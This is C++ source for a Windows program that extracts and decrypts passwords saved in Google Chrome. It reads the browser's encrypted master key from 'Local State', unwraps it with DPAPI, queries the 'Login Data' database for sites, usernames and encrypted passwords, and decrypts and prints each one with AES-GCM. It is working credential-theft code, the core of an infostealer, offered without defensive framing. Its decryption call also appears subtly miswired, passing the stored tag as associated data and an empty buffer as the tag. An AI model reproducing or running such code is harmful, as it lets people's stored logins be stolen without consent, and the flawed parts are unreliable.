#include <iostream>
#include <fstream>
#include <string>
#include <limits>
#include <cassert>
#include <windows.h>
#include <openssl\evp.h>
#include <openssl\err.h>
#include "sqlite-amalgamation-3340000\sqlite3.h"
using namespace std;

int gcm_decrypt(unsigned char *ciphertext, int ciphertext_len,
				unsigned char *aad, int aad_len,
				unsigned char *tag,
				unsigned char *key,
				unsigned char *iv, int iv_len,
				unsigned char *plaintext);

int main(void)
{
	string encodedKeyBase64 = "";
	string stringToFind = "{\"encrypted_key\":\"";
	short stringIter = 0;
	string baseFilePath = getenv("LOCALAPPDATA");
	string localStateFilePath = baseFilePath + "\\Google\\Chrome\\User Data\\Local State";
	char localStateFileCharacter;
	bool foundChromeDatabaseDecryptionKey = false;

	ifstream localStateFile(localStateFilePath);
	if (!localStateFile.is_open())
		return 1;

	while (localStateFile >> localStateFileCharacter)
	{
		if (localStateFileCharacter == stringToFind[stringIter])
		{
			stringIter++;
			if (!stringToFind[stringIter])
			{
				foundChromeDatabaseDecryptionKey = true;
				break;
			}
		}

		else
			stringIter = 0;
	}

	if (!foundChromeDatabaseDecryptionKey)
	{
		cout << "Chrome password database decryption key not found.\n";
		localStateFile.close();
		return 1;
	}

	while (localStateFile >> localStateFileCharacter)
	{
		if (localStateFileCharacter == '\"')
			break;

		encodedKeyBase64 += localStateFileCharacter;
	}

	localStateFile.close();

	DATA_BLOB DataIn;

	if (!CryptStringToBinary((LPCSTR)encodedKeyBase64.c_str(), 0, CRYPT_STRING_BASE64, NULL, &DataIn.cbData, NULL, NULL))
	{
		printf("CryptStringToBinary failed: %d\n", GetLastError());
		return 1;
	}

	BYTE *encodedKeyBase64ByteArray = new BYTE[DataIn.cbData];
	if (encodedKeyBase64ByteArray == nullptr)
	{
		cout << "BYTE array could not be allocated.\n";
		return 1;
	}

	if (!CryptStringToBinary((LPCSTR)encodedKeyBase64.c_str(), 0, CRYPT_STRING_BASE64, encodedKeyBase64ByteArray, &DataIn.cbData, NULL, NULL))
	{
		printf("CryptStringToBinary failed: %d\n", GetLastError());
		delete[] encodedKeyBase64ByteArray;
		return 1;
	}
	DataIn.pbData = &encodedKeyBase64ByteArray[5];
	DataIn.cbData -= 5;

	DATA_BLOB DataOut;
	DataOut.cbData = 0;
	DataOut.pbData = NULL;

	if (!CryptUnprotectData(&DataIn, NULL, NULL, NULL, NULL, 0, &DataOut))
	{
		printf("CryptUnprotectData failed: %d\n", GetLastError());
		delete[] encodedKeyBase64ByteArray;
		LocalFree(DataOut.pbData);
		return 1;
	}

	DWORD tam = 0;

	if (!CryptBinaryToString(DataOut.pbData, DataOut.cbData, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &tam))
	{
		printf("CryptBinaryToString failed: %d\n", GetLastError());
		delete[] encodedKeyBase64ByteArray;
		LocalFree(DataOut.pbData);
		return 1;
	}

	LPSTR decodedKeyBase64 = new char[tam];
	if (decodedKeyBase64 == nullptr)
	{
		cout << "char array could not be allocated\n";
		delete[] encodedKeyBase64ByteArray;
		LocalFree(DataOut.pbData);
		return 1;
	}

	if (!CryptBinaryToString(DataOut.pbData, DataOut.cbData, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, decodedKeyBase64, &tam))
	{
		printf("CryptBinaryToString failed: %d\n", GetLastError());
		delete[] encodedKeyBase64ByteArray;
		delete[] decodedKeyBase64;
		LocalFree(DataOut.pbData);
		return 1;
	}

	cout << decodedKeyBase64 << "\n";

	delete[] encodedKeyBase64ByteArray;
	// LocalFree(DataOut.pbData);

	sqlite3 *chromePasswordDatabase;

	string chromePasswordDatabasePath = baseFilePath + "\\Google\\Chrome\\User Data\\Default\\Login Data";

	if (sqlite3_open_v2(chromePasswordDatabasePath.c_str(), &chromePasswordDatabase, SQLITE_OPEN_READONLY, NULL) != SQLITE_OK)
	{
		cout << sqlite3_errmsg(chromePasswordDatabase);
		delete[] decodedKeyBase64;
		return 1;
	}

	string chromePasswordDatabaseQuery = "SELECT origin_url, username_value, password_value FROM logins";

	sqlite3_stmt *chromePasswordDatabaseStatement;

	if (sqlite3_prepare_v2(chromePasswordDatabase, chromePasswordDatabaseQuery.c_str(), chromePasswordDatabaseQuery.length() + 1, &chromePasswordDatabaseStatement, NULL) != SQLITE_OK)
	{
		cout << sqlite3_errmsg(chromePasswordDatabase);
		sqlite3_close(chromePasswordDatabase);
		delete[] decodedKeyBase64;
		return 1;
	}

	int sqlite3ResultCode;

	while (true)
	{

		sqlite3ResultCode = sqlite3_step(chromePasswordDatabaseStatement);

		if (sqlite3ResultCode == SQLITE_ROW)
		{
			int dataSize = sqlite3_column_bytes(chromePasswordDatabaseStatement, 2);

			const unsigned char *data = sqlite3_column_text(chromePasswordDatabaseStatement, 2);

			unsigned char *encryptedPassword = new unsigned char[dataSize];

			memcpy(encryptedPassword, data, dataSize);

			unsigned char *tag = new unsigned char[100];
			unsigned char *plaintext = new unsigned char[100];

			printf("%d\n",gcm_decrypt(&encryptedPassword[12], dataSize - 12 - 16, &encryptedPassword[dataSize - 16], 16, tag, DataOut.pbData, encryptedPassword, 12, plaintext));

			printf("%s\n", plaintext);
			
			delete[] tag;
			delete[] plaintext;
			delete[] encryptedPassword;

		}

		else if (sqlite3ResultCode == SQLITE_DONE)
		{
			LocalFree(DataOut.pbData);
			sqlite3_finalize(chromePasswordDatabaseStatement);
			sqlite3_close_v2(chromePasswordDatabase);
			delete[] decodedKeyBase64;
			return 0;
		}

		else
		{
			cout << sqlite3_errmsg(chromePasswordDatabase);
			LocalFree(DataOut.pbData);
			sqlite3_finalize(chromePasswordDatabaseStatement);
			sqlite3_close_v2(chromePasswordDatabase);
			delete[] decodedKeyBase64;
			return 1;
		}
	}
}

void handleErrors(void)
{
	ERR_print_errors_fp(stderr);
	abort();
}

int gcm_decrypt(unsigned char *ciphertext, int ciphertext_len,
				unsigned char *aad, int aad_len,
				unsigned char *tag,
				unsigned char *key,
				unsigned char *iv, int iv_len,
				unsigned char *plaintext)
{
	EVP_CIPHER_CTX *ctx;
	int len;
	int plaintext_len;
	int ret;

	/* Create and initialise the context */
	if (!(ctx = EVP_CIPHER_CTX_new()))
		handleErrors();

	/* Initialise the decryption operation. */
	if (!EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL))
		handleErrors();

	/* Set IV length. Not necessary if this is 12 bytes (96 bits) */
	if (!EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, iv_len, NULL))
		handleErrors();

	/* Initialise key and IV */
	if (!EVP_DecryptInit_ex(ctx, NULL, NULL, key, iv))
		handleErrors();

	/*
     * Provide any AAD data. This can be called zero or more times as
     * required
     */
	if (!EVP_DecryptUpdate(ctx, NULL, &len, aad, aad_len))
		handleErrors();

	/*
     * Provide the message to be decrypted, and obtain the plaintext output.
     * EVP_DecryptUpdate can be called multiple times if necessary
     */
	if (!EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len))
		handleErrors();
	plaintext_len = len;

	/* Set expected tag value. Works in OpenSSL 1.0.1d and later */
	if (!EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, tag))
		handleErrors();

	/*
     * Finalise the decryption. A positive return value indicates success,
     * anything else is a failure - the plaintext is not trustworthy.
     */
	ret = EVP_DecryptFinal_ex(ctx, plaintext + len, &len);

	/* Clean up */
	EVP_CIPHER_CTX_free(ctx);

	if (ret > 0)
	{
		/* Success */
		plaintext_len += len;
		return plaintext_len;
	}
	else
	{
		/* Verify failed */
		return -1;
	}
}